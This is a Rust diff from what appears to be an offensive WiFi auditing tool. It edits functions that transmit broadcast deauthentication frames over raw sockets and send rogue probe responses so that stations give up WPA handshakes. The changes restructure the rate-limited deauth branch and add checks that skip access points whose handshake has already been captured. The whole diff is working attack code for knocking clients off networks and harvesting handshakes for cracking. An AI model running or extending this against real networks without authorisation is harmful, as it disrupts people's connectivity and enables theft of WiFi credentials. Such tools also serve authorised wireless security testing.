@@ -298,24 +298,23 @@ pub fn deauth_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<()
                 MessageType::Info,
                 format!("Sending Deauth: {} <=> {}", ap_mac, deauth_client),
             ));
-        } else {
-            // Rate limit broadcast deauths to every 128 beacons.
-            if (beacon_count % 128) == 0 {
-                // There is no client
-                let frx = build_deauthentication_fm_ap(
-                    ap_mac,
-                    &MacAddress([255, 255, 255, 255, 255, 255]),
-                    oxide.counters.sequence1(),
-                    DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
-                );
-                let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        }
+        // Rate limit broadcast deauths to every 128 beacons.
+        if (beacon_count % 128) == 0 {
+            // There is no client
+            let frx = build_deauthentication_fm_ap(
+                ap_mac,
+                &MacAddress::broadcast(),
+                oxide.counters.sequence1(),
+                DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA,
+            );
+            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
 
-                ap_data.interactions += 1;
-                oxide.status_log.add_message(StatusMessage::new(
-                    MessageType::Info,
-                    format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
-                ));
-            }
+            ap_data.interactions += 1;
+            oxide.status_log.add_message(StatusMessage::new(
+                MessageType::Info,
+                format!("Sending Deauth: {} => {}", ap_mac, deauth_client),
+            ));
         }
     }
 
@@ -428,8 +427,6 @@ pub fn rogue_m2_attack_directed(
     }
     let ssid = probe.station_info.ssid.unwrap();
 
-    let ap = oxide.access_points.get_device_by_ssid(&ssid);
-
     if station.timer_interact.elapsed().unwrap() < Duration::from_secs(3) {
         return Ok(());
     }
@@ -492,6 +489,16 @@ pub fn rogue_m2_attack_undirected(
             return Ok(());
         }
 
+        if let Some(ap) = oxide.access_points.get_device_by_ssid(&ssid) {
+            // Make sure this AP is a target and that this AP is
+            if oxide
+                .handshake_storage
+                .has_complete_handshake_for_ap(&ap.mac_address)
+            {
+                return Ok(());
+            }
+        }
+
         // Do we already have a rogue-M2 from this station (for this SSID)
         if station.rogue_actions.get(&ssid).is_some_and(|f| *f) {
             return Ok(());
@@ -519,6 +526,15 @@ pub fn rogue_m2_attack_undirected(
         if oxide.target_data.targets.has_ssid() {
             // Pick a random SSID from our targets and respond.
             let target = oxide.target_data.targets.get_random_ssid().unwrap();
+            if let Some(ap) = oxide.access_points.get_device_by_ssid(&target) {
+                // Make sure this AP is a target and that this AP is
+                if oxide
+                    .handshake_storage
+                    .has_complete_handshake_for_ap(&ap.mac_address)
+                {
+                    return Ok(());
+                }
+            }
 
             let frx = build_probe_response(
                 &probe.header.address_2,
